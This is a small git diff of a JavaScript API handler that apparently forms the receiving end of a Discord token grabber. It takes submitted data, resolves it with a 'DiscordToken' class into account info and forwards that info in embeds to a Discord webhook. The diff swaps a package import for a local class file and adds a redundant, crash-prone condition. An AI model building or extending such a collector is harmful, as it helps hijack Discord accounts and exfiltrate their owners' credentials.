@@ -1,5 +1,5 @@
 import { EmbedBuilder, WebhookClient } from 'discord.js';
-import DiscordToken from 'discord.js-token';
+import DiscordToken from '../../../utils/class.cjs';
 import k4itrunConfig from '../../../../k4itrun.config'
 
 const webhook = new WebhookClient({
@@ -32,8 +32,7 @@ export default async function handler(req, res) {
     console.log(info);
 
     const Discord = new DiscordToken(data).info;
-    const embedBuilder = Discord?.ID
-      ? buildInitializedEmbed(Discord, data, embed)
+    const embedBuilder = (Discord?.ID || Discord.ID) ? buildInitializedEmbed(Discord, data, embed)
       : buildRawEmbed(data, embed);
 
     await webhook.send({
